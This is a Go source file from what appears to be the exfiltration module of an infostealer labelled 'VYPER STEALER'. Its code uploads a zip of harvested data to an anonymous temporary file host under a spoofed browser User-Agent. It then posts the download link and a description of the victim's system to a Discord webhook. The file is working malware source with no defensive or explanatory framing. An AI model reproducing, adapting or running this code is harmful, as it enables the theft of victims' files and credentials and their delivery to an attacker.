package exfiltration

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
)

type discordEmbed struct {
	Title       string `json:"title"`
	Description string `json:"description"`
	Color       int    `json:"color"`
}

type webhookPayload struct {
	Embeds []discordEmbed `json:"embeds"`
}

func PostFileWebhook(webhookURL string, zipBytes []byte, filename string, data *DataStruct) error {
	url, err := uploadToLitterbox(zipBytes, filename+".zip")
	if err != nil {
		return err
	}

	description := getSysDescription(data)
	description += "\n\n**DOWNLOAD (Expires 72h):** " + url

	payload := webhookPayload{
		Embeds: []discordEmbed{
			{
				Title:       "VYPER STEALER",
				Description: description,
				Color:       4109449,
			},
		},
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(payloadBytes))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("%d", resp.StatusCode)
	}

	return nil
}

func uploadToLitterbox(fileData []byte, filename string) (string, error) {
	const litterboxURL = "https://litterbox.catbox.moe/resources/internals/api.php"
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ = writer.WriteField("reqtype", "fileupload")
	_ = writer.WriteField("time", "72h")

	part, err := writer.CreateFormFile("fileToUpload", filename)
	if err != nil {
		return "", err
	}
	_, err = io.Copy(part, bytes.NewReader(fileData))
	if err != nil {
		return "", err
	}
	writer.Close()

	req, err := http.NewRequest("POST", litterboxURL, body)
	if err != nil {
		return "", err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(respBody), nil
}
